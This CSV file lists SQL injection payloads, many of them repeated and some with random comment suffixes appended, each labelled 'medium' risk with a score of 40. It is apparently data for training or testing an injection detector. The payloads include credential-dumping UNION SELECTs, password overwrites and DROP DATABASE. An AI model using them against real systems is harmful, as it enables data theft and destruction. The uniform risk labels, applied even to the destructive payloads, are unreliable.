query,risk,score
' HAVING 1=1 #,medium,40
' OR username LIKE '%admin%' --,medium,40
' OR username LIKE '%admin%' --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
'; SELECT COUNT(*) FROM users --,medium,40
' HAVING 1=1 #,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
'; SELECT @@version --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
'; DROP DATABASE temp --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
'; DROP DATABASE temp --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
'; SELECT @@version --,medium,40
'; UPDATE users SET password='pass',medium,40
' or 1=1 in (select * from users) --,medium,40
'; DROP DATABASE temp --,medium,40
' HAVING 1=1 #,medium,40
'; SELECT @@version --,medium,40
' OR username LIKE '%admin%' --,medium,40
'; UPDATE users SET password='pass',medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
' or 1=1 in (select * from users) --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
'; UPDATE users SET password='pass',medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
'; UPDATE users SET password='pass',medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
'; UPDATE users SET password='pass',medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
' HAVING 1=1 #,medium,40
"' UNION SELECT username, password FROM users --",medium,40
' OR username LIKE '%admin%' --,medium,40
' HAVING 1=1 #,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
'; UPDATE users SET password='pass',medium,40
'; SELECT COUNT(*) FROM users --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
'; UPDATE users SET password='pass',medium,40
'; SELECT COUNT(*) FROM users --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' HAVING 1=1 #,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
'; SELECT @@version --,medium,40
'; UPDATE users SET password='pass',medium,40
'; UPDATE users SET password='pass',medium,40
' or 1=1 in (select * from users) --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' OR username LIKE '%admin%' --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
'; DROP DATABASE temp --,medium,40
'; UPDATE users SET password='pass',medium,40
"' UNION SELECT username, password FROM users --",medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' OR username LIKE '%admin%' --,medium,40
' HAVING 1=1 #,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
'; SELECT @@version --,medium,40
'; UPDATE users SET password='pass',medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
"' UNION SELECT username, password FROM users --",medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
'; SELECT COUNT(*) FROM users --,medium,40
' OR username LIKE '%admin%' --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
'; UPDATE users SET password='pass',medium,40
' HAVING 1=1 #,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
"' UNION SELECT username, password FROM users --",medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' or 1=1 in (select * from users) --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' OR username LIKE '%admin%' --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
'; DROP DATABASE temp --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' HAVING 1=1 #,medium,40
' or 1=1 in (select * from users) --,medium,40
'; DROP DATABASE temp --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
'; DROP DATABASE temp --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' or 1 = 1 LIMIT 1 --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
'; UPDATE users SET password='pass',medium,40
' OR username LIKE '%admin%' --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
' OR username LIKE '%admin%' --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' or 1=1 in (select * from users) --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' or 1=1 in (select * from users) --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
' OR username LIKE '%admin%' --,medium,40
' or 1=1 in (select * from users) --,medium,40
'; SELECT @@version --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
'; SELECT @@version --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
' HAVING 1=1 #,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' OR username LIKE '%admin%' --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
' or 1=1 in (select * from users) --,medium,40
' OR username LIKE '%admin%' --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
'; UPDATE users SET password='pass',medium,40
' OR username LIKE '%admin%' --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
' OR username LIKE '%admin%' --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
'; DROP DATABASE temp --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' OR username LIKE '%admin%' --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' or 1 = 1 LIMIT 1 --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
' OR username LIKE '%admin%' --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
'; UPDATE users SET password='pass',medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
' or 1 = 1 LIMIT 1 --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
'; SELECT COUNT(*) FROM users --,medium,40
'; SELECT @@version --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
'; SELECT @@version --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
'; UPDATE users SET password='pass',medium,40
'; SELECT @@version --,medium,40
' HAVING 1=1 #,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
'; UPDATE users SET password='pass',medium,40
'; SELECT COUNT(*) FROM users --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
'; SELECT @@version --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
' or 1 = 1 LIMIT 1 --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
'; SELECT COUNT(*) FROM users --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
'; SELECT @@version --,medium,40
' OR username LIKE '%admin%' --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' OR username LIKE '%admin%' --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' OR username LIKE '%admin%' --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
' HAVING 1=1 #,medium,40
' HAVING 1=1 #,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
'; SELECT @@version --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' HAVING 1=1 # # jy,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
"' UNION SELECT username, password FROM users -- # qm",medium,40
'; SELECT @@version -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- # 8i,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
'; SELECT COUNT(*) FROM users -- # r6,medium,40
'; SELECT @@version -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
'; SELECT @@version -- # se,medium,40
' UNION SELECT * FROM information_schema.tables -- # e3,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # fr",medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- -- e,medium,40
'; UPDATE users SET password='pass' -- q,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- y",medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # zs",medium,40
' OR username LIKE '%admin%' -- # g6,medium,40
1' OR 1=1; SELECT * FROM users -- # xi,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # rd",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
'; DROP DATABASE temp -- # oh,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
' or 1=1 in (select * from users) -- -- y,medium,40
"' UNION SELECT username, password FROM users -- -- h",medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- # qa,medium,40
' OR username LIKE '%admin%' -- -- m,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 8k",medium,40
' UNION SELECT * FROM information_schema.tables -- # 27,medium,40
1' OR '1' = '1' GROUP BY 1 -- # gg,medium,40
1' OR 1=1; SELECT * FROM users -- -- i,medium,40
' UNION SELECT * FROM information_schema.tables -- -- z,medium,40
1' OR 1=1; SELECT * FROM users -- # 9r,medium,40
' or 1 = 1 LIMIT 1 -- # uq,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' UNION SELECT username, password FROM users -- -- 2",medium,40
'; SELECT @@version -- /**/,medium,40
'; DROP DATABASE temp -- /**/,medium,40
'; DROP DATABASE temp -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- -- 4,medium,40
'; SELECT COUNT(*) FROM users -- -- n,medium,40
"' UNION SELECT username, password FROM users -- -- y",medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
' or 1=1 in (select * from users) -- -- 8,medium,40
1' OR 1=1; SELECT * FROM users -- -- s,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- # vr,medium,40
'; SELECT @@version -- -- g,medium,40
"' UNION SELECT username, password FROM users -- # ks",medium,40
' OR username LIKE '%admin%' -- -- 2,medium,40
1' OR 1=1; SELECT * FROM users -- -- 3,medium,40
' UNION SELECT * FROM information_schema.tables -- # 6n,medium,40
' UNION SELECT * FROM information_schema.tables -- # 2i,medium,40
"' UNION SELECT username, password FROM users -- # yu",medium,40
'; SELECT COUNT(*) FROM users -- # ac,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- n",medium,40
' or 1 = 1 LIMIT 1 -- # dn,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
'; UPDATE users SET password='pass' /**/,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
' OR username LIKE '%admin%' -- -- u,medium,40
' or 1=1 in (select * from users) -- # 8u,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # i4",medium,40
'; DROP DATABASE temp -- -- 2,medium,40
' HAVING 1=1 # /**/,medium,40
'; SELECT @@version -- # mh,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
'; SELECT @@version -- /**/,medium,40
' HAVING 1=1 # -- n,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- t",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- k",medium,40
' HAVING 1=1 # -- 1,medium,40
'; UPDATE users SET password='pass' # pe,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
'; DROP DATABASE temp -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' UNION SELECT username, password FROM users -- # fi",medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
"' UNION SELECT username, password FROM users -- -- f",medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' UNION SELECT username, password FROM users -- # x4",medium,40
"' UNION SELECT username, password FROM users -- # jt",medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # e3",medium,40
'; UPDATE users SET password='pass' # cm,medium,40
"' UNION SELECT username, password FROM users -- # pq",medium,40
'; DROP DATABASE temp -- -- e,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- q",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- q",medium,40
1' OR 1=1; SELECT * FROM users -- # b0,medium,40
'; UPDATE users SET password='pass' -- g,medium,40
"' UNION SELECT username, password FROM users -- # ev",medium,40
'; DROP DATABASE temp -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- # xp,medium,40
1' OR 1=1; SELECT * FROM users -- -- h,medium,40
1' OR 1=1; SELECT * FROM users -- # f8,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' HAVING 1=1 # -- 0,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' HAVING 1=1 # /**/,medium,40
"' UNION SELECT username, password FROM users -- # 29",medium,40
1' OR '1' = '1' GROUP BY 1 -- # jv,medium,40
' HAVING 1=1 # -- j,medium,40
' HAVING 1=1 # -- h,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- # vi,medium,40
'; SELECT @@version -- -- z,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- b",medium,40
' UNION SELECT * FROM information_schema.tables -- # jk,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 13",medium,40
1' OR 1=1; SELECT * FROM users -- # yk,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # w3",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 1x",medium,40
'; SELECT @@version -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- y,medium,40
'; UPDATE users SET password='pass' -- y,medium,40
' or 1 = 1 LIMIT 1 -- # hf,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 7s",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- # mc,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # z5",medium,40
' UNION SELECT * FROM information_schema.tables -- # t2,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
'; SELECT @@version -- # id,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 3",medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
' HAVING 1=1 # -- s,medium,40
'; DROP DATABASE temp -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 2,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- f,medium,40
'; SELECT @@version -- -- o,medium,40
' or 1=1 in (select * from users) -- # 3t,medium,40
'; SELECT @@version -- -- l,medium,40
'; UPDATE users SET password='pass' -- 0,medium,40
'; UPDATE users SET password='pass' # 1g,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- d",medium,40
'; DROP DATABASE temp -- # zu,medium,40
"' UNION SELECT username, password FROM users -- -- q",medium,40
'; SELECT @@version -- -- m,medium,40
'; UPDATE users SET password='pass' # pr,medium,40
'; SELECT COUNT(*) FROM users -- # dj,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 0g",medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- -- f,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- -- s,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- b",medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- a",medium,40
' or 1=1 in (select * from users) -- -- 4,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' OR username LIKE '%admin%' -- # g3,medium,40
' or 1 = 1 LIMIT 1 -- -- y,medium,40
' or 1=1 in (select * from users) -- -- n,medium,40
'; SELECT COUNT(*) FROM users -- # yv,medium,40
'; SELECT @@version -- -- 0,medium,40
' UNION SELECT * FROM information_schema.tables -- # 3d,medium,40
'; DROP DATABASE temp -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' or 1=1 in (select * from users) -- # mc,medium,40
' or 1=1 in (select * from users) -- # 2v,medium,40
'; DROP DATABASE temp -- -- o,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 9p,medium,40
"' UNION SELECT username, password FROM users -- # g5",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
' HAVING 1=1 # -- l,medium,40
' or 1=1 in (select * from users) -- -- o,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- j,medium,40
'; DROP DATABASE temp -- -- s,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- -- r,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
' HAVING 1=1 # -- s,medium,40
' or 1 = 1 LIMIT 1 -- # nm,medium,40
'; UPDATE users SET password='pass' # rw,medium,40
1' OR '1' = '1' GROUP BY 1 -- # hj,medium,40
'; SELECT COUNT(*) FROM users -- # ho,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- h",medium,40
' or 1 = 1 LIMIT 1 -- -- u,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' HAVING 1=1 # -- u,medium,40
' HAVING 1=1 # -- w,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
'; UPDATE users SET password='pass' -- m,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- # ue,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # o4",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # s9",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 7",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' HAVING 1=1 # -- r,medium,40
' or 1 = 1 LIMIT 1 -- -- s,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
'; UPDATE users SET password='pass' -- d,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 4",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # w1",medium,40
1' OR '1' = '1' GROUP BY 1 -- # 1b,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 79",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
'; DROP DATABASE temp -- -- 5,medium,40
' HAVING 1=1 # /**/,medium,40
' HAVING 1=1 # -- w,medium,40
' or 1=1 in (select * from users) -- # ba,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- # sp,medium,40
"' UNION SELECT username, password FROM users -- -- 4",medium,40
' HAVING 1=1 # # z4,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
' HAVING 1=1 # -- u,medium,40
1' OR 1=1; SELECT * FROM users -- -- h,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- w",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
1' OR 1=1; SELECT * FROM users -- # f5,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- # yn,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
'; DROP DATABASE temp -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 6w",medium,40
' HAVING 1=1 # # 7g,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- # lk,medium,40
' or 1 = 1 LIMIT 1 -- # go,medium,40
"' UNION SELECT username, password FROM users -- -- 8",medium,40
'; SELECT @@version -- # f7,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' HAVING 1=1 # -- q,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # uy",medium,40
"' UNION SELECT username, password FROM users -- -- c",medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
'; UPDATE users SET password='pass' # df,medium,40
"' UNION SELECT username, password FROM users -- # zc",medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- # bd,medium,40
' HAVING 1=1 # /**/,medium,40
'; DROP DATABASE temp -- # ke,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 9i",medium,40
' or 1 = 1 LIMIT 1 -- -- 3,medium,40
"' UNION SELECT username, password FROM users -- -- r",medium,40
' UNION SELECT * FROM information_schema.tables -- # 03,medium,40
' OR username LIKE '%admin%' -- # ge,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # dc",medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # io",medium,40
1' OR 1=1; SELECT * FROM users -- # k7,medium,40
'; DROP DATABASE temp -- # sn,medium,40
'; SELECT @@version -- -- 7,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # k2",medium,40
' HAVING 1=1 # -- d,medium,40
' OR username LIKE '%admin%' -- # 9l,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 6",medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
'; UPDATE users SET password='pass' -- v,medium,40
'; SELECT @@version -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- # cj,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
' HAVING 1=1 # /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- # 9s,medium,40
' OR username LIKE '%admin%' -- -- 7,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
'; SELECT @@version -- -- v,medium,40
' or 1=1 in (select * from users) -- # ui,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # ly",medium,40
'; UPDATE users SET password='pass' /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # gy",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # db",medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
' OR username LIKE '%admin%' -- # hc,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # q9",medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
' HAVING 1=1 # /**/,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- # pe,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 8g",medium,40
'; UPDATE users SET password='pass' # z8,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
